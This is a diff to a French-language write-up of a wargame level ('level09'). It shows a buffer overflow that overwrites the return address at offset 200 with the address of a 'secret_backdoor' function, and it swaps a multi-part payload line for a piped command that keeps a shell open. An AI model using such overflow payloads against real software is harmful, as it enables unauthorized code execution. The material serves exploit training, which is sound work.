@@ -122,10 +122,5 @@ Partie 2: Message
 La recriture de l'eip se faisant a partir de l'offset 200, nous allons input 200 octects, puis mettre l'adresse de secret_backdoor:
 python -c 'print "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]'
 
-Partie 3: System
-On va juste ecrire "/bin/sh":
-python -c 'print "/bin/sh"'
-
-Afin de pouvoir tout input dans une seule commande, on va utiliser le comportement de fgets. En effet, il arrete la lecture a chaque \n. Nous allons faire une seule commande python, en mettant un \n entre parties:
-python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh"'
+(python -c 'print "A" * 40 + "\xff"'; python -c 'print "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]'; cat) | ./level09 
 
